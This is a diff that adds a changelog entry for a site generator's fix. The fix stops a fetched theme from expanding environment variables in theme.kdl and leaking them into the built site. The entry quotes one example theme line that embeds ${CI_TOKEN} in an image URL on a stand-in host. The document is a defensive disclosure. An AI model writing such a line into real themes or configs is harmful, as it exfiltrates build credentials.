@@ -10,6 +10,16 @@ chores are visible in the git history and change nothing for a site.
 [kac]: https://keepachangelog.com/en/1.1.0/
 [semver]: https://semver.org/spec/v2.0.0.html
 
+## [Unreleased]
+
+### Fixed
+
+- **A theme can no longer read the build machine's environment.** `${VAR}` expanded in
+  every string a theme's `theme.kdl` sets, and only four credential variables were
+  refused, so a fetched theme could publish any other variable (`html { meta { image
+  "https://x/${CI_TOKEN}" } }`) in the built site. A `${VAR}` in a theme is now an error;
+  `${VAR:-default}` still resolves to its default. The site's own config is unaffected.
+
 ## [0.0.19] - 2026-10-26
 
 ### Added
